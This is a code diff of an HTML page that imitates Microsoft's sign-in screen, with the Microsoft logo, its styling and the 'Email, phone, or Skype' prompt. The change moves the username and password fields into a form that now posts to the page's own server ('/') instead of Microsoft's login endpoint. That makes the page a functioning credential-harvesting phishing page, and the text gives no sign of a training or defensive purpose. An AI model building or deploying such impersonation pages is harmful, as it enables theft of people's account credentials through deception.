@@ -1,79 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
-  </head>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Microsoft Login</title>
+</head>
 
-  <body
-    style="
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #f2f2f2;
-    "
-  >
-    <div
-      style="
-        background: white;
-        padding: 40px;
-        width: 300px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      "
-    >
-      <img src="Microsoft.png" style="width: 100%; margin-bottom: 20px" />
-      <h2 style="margin: 0 0 10px">Sign in</h2>
+<body style="
+  margin: 0;
+  font-family: 'Segoe UI', sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  background: #f2f2f2;
+">
+  <div style="
+    background: white;
+    padding: 40px;
+    width: 300px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  ">
+    <img src="Microsoft.png" alt="Microsoft Logo" style="width: 100%; margin-bottom: 20px" />
+    <h2 style="margin: 0 0 10px">Sign in</h2>
+
+    <!-- Form starts here and submits to "/" -->
+    <form action="/" method="POST">
       <input
+        name="username"
         type="text"
         placeholder="Email, phone, or Skype"
-        style="
-          width: 100%;
-          padding: 10px;
-          margin: 10px 0;
-          border: 1px solid #ccc;
-          border-radius: 0;
-        "
+        required
+        style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc;"
       />
-      
-    <input
-    type="password"
-    placeholder="Password"
-    style="
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 0;
-      -webkit-text-security: disc;
-    "
-    /><a
-        href="#"
-        style="font-size: 12px; text-decoration: none; color: #0067b8"
-        >No account? Create one!</a
-      ><br />
-      
-    <form
-      action="https://login.microsoftonline.com/"
-      method="POST"
-      style="margin-top: 20px"
-    >
-      <button
-        type="submit"
-        style="
-          width: 100%;
-          padding: 10px;
-          background: #0067b8;
-          color: white;
-          border: none;
-        "
-      >
+      <input
+        name="password"
+        type="password"
+        placeholder="Password"
+        required
+        style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; -webkit-text-security: disc;"
+      />
+      <a href="#" style="font-size: 12px; text-decoration: none; color: #0067b8;">No account? Create one!</a><br />
+      <button type="submit" style="margin-top: 20px; width: 100%; padding: 10px; background: #0067b8; color: white; border: none;">
         Next
       </button>
     </form>
-    </div>
-  </body>
+  </div>
+</body>
 </html>
